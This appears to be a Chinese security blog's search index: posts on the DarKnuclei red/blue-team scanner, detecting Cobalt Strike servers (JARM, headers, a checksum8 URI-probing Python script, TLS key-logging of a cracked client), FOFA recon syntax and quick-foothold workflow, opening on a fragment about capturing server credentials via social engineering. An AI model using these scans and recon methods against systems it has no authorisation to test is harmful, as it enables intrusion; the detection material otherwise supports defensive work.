觉得自己可能是输入错误。 发现了异常，但是找不到异常地方以及文件。 我们在burp suite上成功接收了来自服务器的ip地址，用户名以及密码。","tags":["红队"],"categories":["社工"]},{"title":"DarKnuclei 工具使用技巧","path":"/posts/33805.html","content":"0.1 DarKnuclei 入门技巧DarKnuclei是一款适合针对红蓝对抗的一款工具【可跨平台使用】，不仅仅可以在红队视角下的快速打点，还可以在蓝队视角下针对红队基础设施与服务进行探针扫描，DarKnuclei在针对红队基础设施进行扫描针对C2，采用强&#x2F;弱特征，通过C2一些特征值去识别探针，在保证准确率的情况下去尽可能识别多C2，内置yaml语法，使用者可以自己编写yaml文件，识别特定的C2。 项目地址：https://github.com/RuoJi6/DarKnuclei 0.1.1 前置配置在使用DarKnuclei之前要进行一些设置，需要满足以下条件： 如果需要进行漏洞扫描需要将nuclei加入环境变量【同时需要下载nuclei-templates，并在config.ini中配置】。 如需使用测绘功能请修改config.ini添加key。 python版本：python3。 如果是mac或linux请下载对于的执行程序在plugin目录，并配置config.ini。 observer_ward gogo tlsx 配置完以上信息，就可以完美的使用DarKnuclei。 0.1.2 在红队视角下不管是蓝队模块还是会对模块扫描后的结果会保存在project文件中，其中txt为详细信息，html为简略信息。 在上文中，配置完成之后，我们运行python main.py -h可以查看帮助信息； 此时NSM WEB GOGO属于红队模块，RTSCAN属于蓝队模块，接下来我们展开讲讲红队模块： 0.1.2.1 NSM [测绘资产]解决问题：在攻防的时候，拿到手资产，是ip或者是域名又或者是公司怎么样进行快速打点？ 此模块是通过测绘平台进行扫描，前提是需要配置好fofa，以及quake key。 python3 main.py NSM -h查看帮助信息。 案例1在案例1中，我们可以看到输入目标资产的一些信息，查询相关资产【注意如果没有加上-n或-b视为只资产测绘进行查询，而不进行指纹识别以及漏洞扫描】 1python3 main.py NSM -ip xxx.xxx.xxx.xxx -icp 京ICP证030173号 -domain baidu.com -body 百度公司 -title 百度公司管理 在下面两个参数重，根据需求选择，选择之后，将进行相应的模块。 12-b, --observer 指纹扫描-n, --nuclei 指纹+漏洞扫描 【DarKnuclei在设计只初参考了大量的扫描器，DarKnuclei在进行漏洞扫描的时候，均是先指纹识别，通过指纹查询对于的POC，才进行对应的漏洞扫描】 0.1.2.2 WEB [WEB扫描]解决问题：在攻防的时候，拿到一堆资产的时候，怎么样快速打点？ 此模块没有测绘功能，需要用户输入目标，或者是目标集合的文件【如：url.txt】，而且需要注意的是，输入的目标需要是http:&#x2F;&#x2F;或者是https:&#x2F;&#x2F;开头的资产才行，否则会跳过此资产。 0.1.2.3 GOGO [GOGO扫描]解决问题：在攻防的时候，拿到一堆资产的时候，而且资产杂乱，有的是IP，有的是域名，有的带有http，又或者是https，这个时候此工具可以快速的识别并整理资产。【自动识别web资产还有扫描IP信息，识别是http或者是https】 强烈推荐此模块，此模块在针对上一个模块中，针对资产杂乱的问题进行解决，并且，可以定制指定端口扫描。 其中，此工具在使用的时候，必须调用下面两个参数，二选一。 12-b, --observer 指纹扫描-n, --nuclei 指纹+漏洞扫描 0.1.3 在蓝队视角下 【RTSCAN】解决问题：在通过设备捕捉到红队IP的时候，蓝队成员在编写溯源报告的时候，针对红队服务器上开放了什么服务，或者说使用了什么C2进行的攻击，不清楚，此工具不仅仅针对红队平台【ARL…..】，可以针对服务【JNDI…】，还可以针对红队部署的C2【vshell…..】等。 在下图中，列出了目前版本覆盖类型以及指纹。 0.1.3.1 特征覆盖✅\t强特征 ☑️\t弱特征 平台&#x2F;服务 名字 类型 特征 计划中 备注 ARL(灯塔) platform ✅ Scope Sentry platform ✅ NPS platform ✅ AWVS platform ✅ Nessus platform ✅ XSS平台 platform ✅ BeEF platform ✅ H platform ✅ LangSrcCurise platform ✅ Medusa platform ✅ NextScan platform ✅ prismx platform ✅ CyberEdge platform ✅ SerializedPayloadGenerator platform ✅ web-chains platform ✅ RevSuit platform ✅ MemShellParty platform ✅ vulfocus platform ✅ gophish platform ✅ testnet platform ✅ rengine platform ✅ JNDI-Injection-Exploit-Plus Tools ✅ 只针对ldap强特征，rmi,jetty弱特征 JNDI-Injection-Exploit Tools ✅ 只针对ldap强特征，rmi,jetty弱特征 rogue-jndi Tools ✅ 只针对ldap强特征，rmi,jetty弱特征 JNDIMap Tools ✅ 只针对ldap强特征，rmi,jetty弱特征 ysoserial Tools ✔️ C2 名字 版本 登录&#x2F;连接 监听端口 UDP流量 TCP流量 HTTP&#x2F;S流量 计划中 备注 vshell 4.9.3~4.6.0 ✅ ✅ ✅ ✅ Cobalt Strike ✅ ✅ Metasploit ✅ ✅ Supershell 2.0.0 ✅ ✅ Viper ✅ ☑️ ✔️ Daybreak ✔️ chisel ✔️ sliver ✔️ Havoc ✔️ Iom ✔️ Villain ✔️ VenomRA ✔️ ShadowPad ✔️ Shad0w ✔️ Remcos RAT ✔️ QuasarRAT ✔️ Pupy-C2 ✔️ PoshC2 ✔️ PlugX RAT ✔️ Orcus-RAT ✔️ Ninja ✔️ Mythic ✔️ Havoc ✔️ Hak5 Cloud ✔️ Gh0st ✔️ Empire ✔️ DeimosC2 ✔️ DcRAT ✔️ Covenant ✔️ Brute Ratel C4 ✔️ BitRAT ✔️ AsyncRAT ✔️ manjusaka ✔️ 0.1.3.2 使用 python3 main.py RTSCAN -a 此命令可以查看支持的C2的类型，name，以及tags等。 在下面命令中，扫描xxx.xxx.xxxIP中的带有C2 tags的yaml文件。【如果没有指定端口，将会扫描默认常见红队开放端口】 1python3 main.py RTSCAN - i xxx.xxx.xxx -t c2 注意：有些扫描时有感的，所以请配置代理。 效果： 0.1.4 日志&amp;报错在程序运行的时候，不可避免因为代码或者说网络问题出现的错误，日志文件会在log_目录下，以周为单位记录日子，且保留最多3个备份文件，超过的旧文件会被删除。 日志的多个格式: 1234567891011121314152025-01-25 16:11 || INFO || run_def.py || gogo+指纹+漏洞 || /Users/hacker/filename/代码/代码/RT/DarKnuclei_scan/run_def.py 263# 时间 || 级别 || 文件 || 模块 || 文件绝对路径 || 行数# 通常我们只需要关注ERRROR信息，通常在发生ERROR错误的时候，会出现报错原因，且在日志中呀详细的记录，下面是一个错误演示，其中我们可以通过日志进行排查错误。 2025-01-25 16:10 || ERROR || scan.py || An unexpected error occurred: [Errno 2] No such file or directory: &#x27;plugin\\\\gogo_darwin_arm64&#x27; || /Users/hacker/filename/代码/代码/RT/DarKnuclei_scan/scan.py 10082025-01-25 16:10 || ERROR || scan.py || An unexpected error occurred: [Errno 2] No such file or directory: &#x27;plugin\\\\gogo_darwin_arm64&#x27;Traceback (most recent call last): File &quot;/Users/hacker/filename/代码/代码/RT/DarKnuclei_scan/scan.py&quot;, line 866, in scan_gogo_one with subprocess.Popen( File &quot;/Users/jiruo/.pyenv/versions/3.9.21/lib/python3.9/subprocess.py&quot;, line 951, in __init__ self._execute_child(args, executable, preexec_fn, close_fds, File &quot;/Users/jiruo/.pyenv/versions/3.9.21/lib/python3.9/subprocess.py&quot;, line 1837, in _execute_child raise child_exception_type(errno_num, err_msg, err_filename)FileNotFoundError: [Errno 2] No such file or directory: &#x27;plugin\\\\gogo_darwin_arm64&#x27; || /Users/hacker/filename/代码/代码/RT/DarKnuclei_scan/scan.py 1009 0.1.5 扩展红队YAMLDarKnuclei 在红队视角下，用户可自定义YAML文件，针对特定的服务或者C2进行扩展。【待定完成】","tags":["tools"],"categories":["tools"]},{"title":"Cobalt Strike主动识别方案","path":"/posts/58642.html","content":"最近在编写针对红队基础设施扫描的时候，研究针对红队C2识别一些方案特征，这里我们以Cobalt Strike作为特征举例。 0.1 思路众所周知，Cobalt Strike端口可以分为监听端口和Team Server连接端口。 监听端口：Cobalt Strike的Listeners。 连接端口：从客户端连接服务端的端口，由Team Server启动。 由于在攻防中，常见的Cobalt Strike监听端口是HTTP&#x2F;HTTPS，所有这里我们主要去研究HTTP/S和Team Server端口特征方法。 配置【Cobalt Strike 4.7】： 0.2 HTTP&#x2F;S 监听端口特征一 JARM【弱特征】JARM 是一种用于识别和分类 TLS（传输层安全）服务器的指纹识别工具。它通过向目标服务器发送特定构造的 TLS Client Hello 数据包，分析服务器返回的 Server Hello 响应，提取特定属性，生成独特的指纹。这些指纹可用于： 验证服务器组的 TLS 配置一致性：快速检查一组服务器是否具有相同的 TLS 配置。 服务器分组：根据 TLS 配置，将互联网上的服务器进行分组，例如，识别可能属于特定组织（如 Google、Salesforce、Apple）的服务器。 应用程序或基础设施识别：识别默认的应用程序或基础设施。 恶意服务器检测：识别互联网上的恶意软件命令和控制基础设施以及其他恶意服务器。 JARM 的工作原理包括： 发送特定的 TLS Client Hello 数据包：主动向目标 TLS 服务器发送 10 个特定构造的 Client Hello 数据包。 捕获服务器响应：记录服务器返回的 Server Hello 响应，提取其中的特定属性。 生成指纹：对收集的服务器响应进行处理，生成一个 62 字符的指纹，其中前 30 个字符表示服务器对每个 Client Hello 的密码套件和 TLS 版本选择，后 32 个字符是服务器发送的累积扩展名的截断 SHA256 哈希。 projectdiscovery&#x2F;tlsx: Fast and configurable TLS grabber focused on TLS based data collection. 特征：2ad2ad16d2ad2ad00042d42d00042ddb04deffa1705e2edc44cae1ed24a4da，但是由于可以自己生成SSL证书，所有JARM只能算是弱特征。 特征二 响应头【弱特征】默认访问 当我们使用OPTIONS去请求就会出现Allow: OPTIONS,GET,HEAD,POST。 特征：发送OPTIONS得到Allow: OPTIONS,GET,HEAD,POST。 特征三 checksum8算法【强特征】Cobalt Strike 中的 checksum8。在 Cobalt Strike 中，checksum8 是一种用于确定请求 URI 的算法。当用户向 Team Server 发送 HTTP 请求时，服务器会将请求的 URI 传递给 checksum8 函数，并将结果与整数值 92L 或 93L 进行比较。如果结果匹配，服务器将返回相应的 Beacon 二进制负载。具体而言，checksum8 用于区分 32 位和 64 位的 Beacon 负载。 以下是 checksum8函数的 Java 实现： 1234567891011public static long checksum8(String text) &#123; if (text.length() &lt; 4) &#123; return 0L; &#125; text = text.replace(&quot;/&quot;, &quot;&quot;); long sum = 0L; for (int x = 0; x &lt; text.length(); x++) &#123; sum += text.charAt(x); &#125; return sum % 256L;&#125; 也就是说checksum8实现之后的URL是固定的不是随机的，下面我们通过python代码实现这个算法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import requestsimport stringfrom itertools import productimport warningswarnings.filterwarnings(&quot;ignore&quot;)def checksum8(uri): &quot;&quot;&quot; 计算 URI 的 checksum8 值。 &quot;&quot;&quot; if len(uri) &lt; 4: return 0 uri = uri.replace(&quot;/&quot;, &quot;&quot;) total = sum(ord(char) for char in uri) return total % 256def generate_uris(): &quot;&quot;&quot; 生成满足 checksum8 为 92（32 位）和 93（64 位）的 URI 列表。 &quot;&quot;&quot; chars = string.ascii_letters + string.digits for combo in product(chars, repeat=4): uri = &#x27;&#x27;.join(combo) cs8 = checksum8(uri) if cs8 == 92: yield uri, &#x27;32-bit&#x27; elif cs8 == 93: yield uri, &#x27;64-bit&#x27;def check_cs_server(base_url): &quot;&quot;&quot; 检查目标服务器是否为 Cobalt Strike 服务器。 &quot;&quot;&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27; &#125; for uri, arch in generate_uris(): url = f&quot;&#123;base_url&#125;/&#123;uri&#125;&quot; try: response = requests.get(url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and response.headers.get(&#x27;Content-Type&#x27;) == &#x27;application/octet-stream&#x27;: print(f&quot;可能的 Cobalt Strike 服务器，架构：&#123;arch&#125;，URI：&#123;url&#125;&quot;) # return except requests.RequestException as e: print(f&quot;请求 &#123;url&#125; 时出错：&#123;e&#125;&quot;) print(&quot;未检测到 Cobalt Strike 服务器。&quot;)if __name__ == &quot;__main__&quot;: target_url = &quot;https://192.168.65.170:3344&quot; check_cs_server(target_url) 结果： 特征：发送/aaa9如果HTTP&#x2F;S是Cobalt Strike，会返回Content-Type: application/octet-stream，而且会返回响应体，其中我们可以判断Content-Type: application/octet-stream以及是否存在响应体，以及响应体长度是否大于2000。 0.3 Team Server 连接端口特征一 JARM【弱特征】Team Server用于Cobalt Strike客户端连接到服务器的端口，其中Team Server也使用到了SSL，所有我们可以使用在上文中的JARM去检测。 特征二 TCP流量【强特征】在通过客户端连接到Team Server的时候会产生一系列TLS数据包，其中我们需要使用Wireshark进行抓包解密流量查看特征。 12/usr/lib/jvm/java-11-openjdk-amd64/bin/java -javaagent:jSSLKeyLog.jar=ssss.txt -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=CSAgent.properties -Duser.language=en -jar cobaltstrike-client.jarjava -javaagent:&lt;jar包的路径&gt;=&lt;sslkey的存放目录&gt; &lt;正常的jar包路径及参数&gt; jSSLKeyLog 是一个与 Java 应用程序中的 SSL&#x2F;TLS 加密通信相关的工具或机制，主要用于调试和分析 SSL&#x2F;TLS 连接。它的核心作用是记录 SSL&#x2F;TLS 会话的密钥材料（key material），这些密钥材料可以用于解密加密的网络流量。 下载：jSSLKeyLog-1.3.zip java8-11运行 我们需要在客户端开启抓包，同时启动jSSLKeyLog.jar。【此处使用的Cobalt Strike需要是破解版本】 Edit-&gt;Prefernces…-&gt;Protocols-&gt;TLS 导入我们刚刚使用jSSLKeyLog 抓取到的TLS证书密钥。 筛选TCP流量，选择追踪流，追踪TLS 如果抓取密码成功则是下图片，如果失败则为空。 我们可以看到，我们从客户端输入的密码。 当我们输入成功的密码时，原始数据显示： 当我们输入错误密码时，原始数据显示： 而且密码组成是： 1b&#x27;\\x00\\x00\\xbe\\xef\\tadmin123aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27; 也就是我们可以通过发送，接收返回值探针是否连接成功：发送请求登录请求数据，判断数据是否是00000000或者是0000cafe。 0.4 总结结合上面两个思路我们可以通过构造特定的数据包去请求Cobalt Strike端口以及特征，需要注意的是这些请求都是有感知的，也就是说在服务端那边是有感知数据的，如下图： 我们可以看到在Web Log以及Team Server存在响应。 JARM 响应头，响应体 checksum8算法 TCP流量 我们可以通过上面四种方式去探针服务器是否部署了Cobalt Strike。 0.5 关于 DarKnuclei关于 DarKnuclei，DarKnuclei专注于红蓝对抗一款工具，不仅可以扫描漏洞，快速打点，还可以扫描红队基础设施与服务，拥有高扩展的yaml格式指纹文件，方便自己编写红队基础设施指纹。如下图，探针Cobalt Strike端口，判断是否为部署了Cobalt Strike。 html报告 项目地址RuoJi6&#x2F;DarKnuclei","tags":["C2"],"categories":["C2"]},{"title":"测绘语法收集资产","path":"/posts/15280.html","content":"在上一篇关于【关于快速打点思考】中，写到了关于测绘收集资产，这里我们详细的展开讲讲，以FOFA举例，其它的测绘语法大同小异。 FOFA常用搜索语法123456789101112icp=&quot;备案号&quot; # icp=&quot;京ICP证030173号&quot;domain=&quot;域名&quot; # icp=&quot;baidu.com&quot;cert.subject.cn=&quot;证书持有者的通用名称&quot; # cert.subject.cn=&quot;baidu.com&quot;cert.subject.org=&quot;证书持有者的组织&quot; # cert.subject.org=&quot;Beijing Baidu Netcom Science Technology Co., Ltd&quot;title=&quot;beijing&quot; # 网页标题body=&quot;网络空间测绘&quot;\t# 网页正文after=&quot;2024-01-01&quot;\t# 筛选2024-01-01之后有更新的资产before=&quot;2024-12-01&quot;\t# 筛选2024-12-0之前有更新的资产host=&quot;.fofa.com&quot; # 通过主机名进行查询cert=&quot;xxxxx&quot; # 证书序列号查询&amp;&amp; #逻辑与|| #逻辑或 SSL证书SLL是很多人打点的时候忽略掉的一点，为什么SSL证书可以搜索到更加隐蔽的资产？因为网站运维人员在部署SLL证书的时候，对IP地址进行了部署，导致了有些网站访问会出现下面情况，因为SSL证书与域名对不上或者是过期导致，但是我们通过FOFA测绘可以通过证书搜索到绑定证书的资产。 SSL证书我们需要提取一下三点： 证书持有者的通用名称。 证书持有者的组织。 证书序列号。 123cert.subject.cn=&quot;baidu.com&quot; # 证书持有者的通用名称cert.subject.org=&quot;Beijing Baidu Netcom Science Technology Co., Ltd&quot; # 证书持有者的组织cert=&quot;24217219254604001662049442027&quot; # 证书序列号十进制【去冒号查询】 结果： 编写自己的脚本在攻防时候，想要快人一步进行打点，在上一篇文章中【关于快速打点思考】，笔者是将测绘资产进行处理，而读者也可以自行处理，通过FOFA API接口进行操作，下面是搜索集合语句。 常用语法： 查询筛选2024-01-01之后有更新的资产。 1icp=&quot;备案号&quot; || domain=&quot;域名&quot; || cert.subject.cn=&quot;证书持有者的通用名称&quot; || cert.subject.org=&quot;证书持有者的组织&quot; || title=&quot;beijing&quot; || body=&quot;网络空间测绘&quot; || host=&quot;.fofa.com&quot; || cert=&quot;xxxxx&quot; &amp;&amp; after=&quot;2024-01-01&quot; 查询筛选2024-01-01之前有更新的资产 1icp=&quot;备案号&quot; || domain=&quot;域名&quot; || cert.subject.cn=&quot;证书持有者的通用名称&quot; || cert.subject.org=&quot;证书持有者的组织&quot; || title=&quot;beijing&quot; || body=&quot;网络空间测绘&quot; || host=&quot;.fofa.com&quot; || cert=&quot;xxxxx&quot; &amp;&amp; before=&quot;2024-01-01&quot; 注意：关于测绘收录时间年限，每个测绘平台定义不一样，需要读者自行测试。","tags":["资产测绘"],"categories":["信息收集"]},{"title":"关于快速打点思考","path":"/posts/24712.html","content":"项目：RuoJi6&#x2F;DarKnuclei 0.1 思路在前期怎么样对目标进行快速的渗透测试？通过测绘资产快速的进行收集互联网暴露资产，联动指纹识别以及联动扫描工具进行打点。 0.2 难点在攻防或者是渗透测试的时候，组织方给的资产大致分为： 公司名单表 一堆杂乱资产 所以，在编写项目的时候也需要考虑到这两点问题，公司名单列表通过测绘引擎进行处理，一堆杂乱资产通过识别为IP以及WEB进行处理。 0.3 解决0.3.1 测绘语法多角度收集测绘语法如下，同时使用或逻辑进行处理资产。【关于测绘语法，请看下篇文章】 ICP备案号 域名 IP地址 host信息 网站title和body 一年前后数据 SSL证书 公用名 组织 序列号 0.3.2 处理资产在攻防期间，组织方给的目标有可能是： 12345http://baidu.comhttp://baidu.com:1122https://192.168.23.1:8899192.168.23.1baidu.com 进行测试的时候，就需要对资产进行处理，才能进行下一步扫描。 1234567891011121314151617181920212223http://baidu.com http://baidu.com:1122https://192.168.23.175:8899http://baidu.com/asdxasd/asd192.168.23.1conasdasd.com192.168.123.175:1122处理为：http://baidu.com http://baidu.com/asdxasd/asdhttp://baidu.com:1122https://192.168.23.175:8899http://conasdasd.comhttps://conasdasd.comhttps://192.168.124.175:8899http://192.168.123.175:1122https://192.168.123.175:1122192.168.123.175192.168.23.1192.168.124.175 其中，处理分为两部分：WEB，IP。 0.4 扫描处理0.4.1测绘引擎处理得到测绘结果中的IP资产，使用gogo进行资产扫描。 将测绘结果去重，使用observer_ward进行指纹探针，找到对应的指纹使用nuclei使用对应的POC进行扫描。 0.4.2 杂乱资产处理根据杂乱资产：我们可以分成两种情况需要扫描： WEB资产【测绘资产】 IP资产 其中IP需要进行端口扫描，才能进行下一步操作。 资产识别→WEB等待[gogo探测结果] 资产识别→IP→gogo端口探测→收集WEB资产[包括一开始收集的结果]→指纹识别→漏洞扫描 资产识别，分为两种资产，其中IP资产使用gogo自带指纹识别以及漏洞探针进行扫描，将带有WEB的资产和首次识别到的WEB资产进行合并，使用observer_ward进行指纹探针，找到对应的指纹使用nuclei使用对应的POC进行扫描。 0.5 优缺点0.5.1 优点 使用多个测绘语句结合，保证资产结构最大化。 针对杂乱资产，不遗留资产。 0.5.1 缺点需要人进行维护指纹以及POC保证是最新的，需要有一套漏洞运营流程，针对攻防出现的高危POC进行维护更新，这个也是我团队所在做的事情，需要日积月累才能有成效。 0.6 后续思考 针对红队C2服务器进行指纹识别。 C2服务器默认特征，vshell一键上线默认端口探测，以及红队扫描器WEB地址识别，以及yakit，和JNDI注入工具端口识别。 针对防守方蜜罐进行识别。 蜜罐的JS文件，或者是蜜罐的一些特征，又或者是，探测首个发包之后，有没有请求一些敏感域名：qq，baidu等。","tags":["红队"],"categories":["信息收集"]},{"title":"Hello World","path":"/posts/16108.html","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"about","path":"/about/index.html","content":"弱鸡Admin"}]